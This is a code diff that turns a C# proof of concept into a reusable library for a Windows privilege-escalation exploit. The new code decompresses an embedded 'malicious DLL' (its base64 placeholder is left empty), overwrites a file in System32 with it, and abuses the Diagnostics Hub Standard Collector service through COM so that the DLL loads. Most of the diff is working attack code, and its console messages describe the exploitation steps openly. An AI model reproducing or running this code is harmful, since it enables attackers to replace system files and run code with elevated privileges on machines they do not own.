@@ -1,13 +1,16 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.IO;
+using System.Threading;
 using System.Diagnostics;
 using System.Globalization;
+using System.IO.Compression;
+using System.Collections.Generic;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 
 namespace SystemCollector
 {
-    internal class Program
+    public class DLL
     {
 
         private static IStandardCollectorService _service;
@@ -15,10 +18,23 @@ namespace SystemCollector
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int ManualRegisterInterfacesDelegate();
 
-        public static void Main(string[] args)
+        public static void Load(string filename)
         {
+            // add your shizz here
+            var dll = DecompressDLL(Convert.FromBase64String(""));
+
             var sessionId = Guid.NewGuid();
             var scratch = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp";
+
+            // backup
+            Console.WriteLine($@" [>] Backing up {filename} to {scratch}");
+            File.Copy($@"C:\Windows\System32\{filename}", $@"{scratch}\{filename}");
+
+            // overwrite
+            Console.WriteLine($@" [>] Overwriting C:\Windows\System32\{filename} with malicious DLL");
+            File.WriteAllBytes($@"C:\Windows\System32\{filename}", dll);
+
+            Thread.Sleep(1000);
 
             var procId = Process.GetCurrentProcess().Id;
             var sessionConfiguration = new SessionConfiguration
@@ -34,21 +50,45 @@ namespace SystemCollector
 
             var procIds = new List<uint> { (uint)procId };
 
-            string etlFile = "license.rtf";
             var badAgent = new Dictionary<Guid, string>
             {
                 {DefaultAgent.Clsid, DefaultAgent.AssemblyName},
-                {sessionId, etlFile}
+                {sessionId, filename}
             };
 
-            Console.WriteLine("[-] Getting new collector service");
+            Console.WriteLine(" [>] Getting new collector service");
             _service = GetCollectorService();
 
             SetProxyBlanketForService(_service);
-            Console.WriteLine("[-] Starting session with DLL payload");
+            Console.WriteLine(" [>] Starting session with DLL payload");
             Start(sessionConfiguration, badAgent, procIds);
-            Console.WriteLine($@"[+] All Done! Remember to delete the DLL: C:\Windows\System32\{etlFile}");
-            Console.ReadLine();
+            Console.WriteLine($@" [!] All Done. Remember to restore {scratch}\{filename}");
+
+            // give it some time. if you exit too early, it won't run.
+            Thread.Sleep(3000);
+        }
+
+        public static byte[] DecompressDLL(byte[] gzip)
+        {
+            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
+            {
+                const int size = 4096;
+                byte[] buffer = new byte[size];
+                using (MemoryStream memory = new MemoryStream())
+                {
+                    int count = 0;
+                    do
+                    {
+                        count = stream.Read(buffer, 0, size);
+                        if (count > 0)
+                        {
+                            memory.Write(buffer, 0, count);
+                        }
+                    }
+                    while (count > 0);
+                    return memory.ToArray();
+                }
+            }
         }
 
         public static void Start(SessionConfiguration sessionConfiguration, Dictionary<Guid, string> agents, List<uint> processIds)
@@ -66,13 +106,13 @@ namespace SystemCollector
                 catch (Exception ex)
                 {
                     Console.WriteLine(agent.Key == sessionConfiguration.SessionId
-                        ? "[+] DLL should have loaded!"
-                        : $"[!] Error adding agent {agent.Key}: {ex.Message}");
+                        ? " [>] DLL should have loaded"
+                        : $" [x] Error adding agent {agent.Key}: {ex.Message}");
                 }
             }
 
             collectionSession.Start();
-            Console.WriteLine("[+] Collector session started!");
+            Console.WriteLine(" [>] Collector session started");
 
             SetProxyBlanketForSession(collectionSession);
             foreach (var processId in processIds)
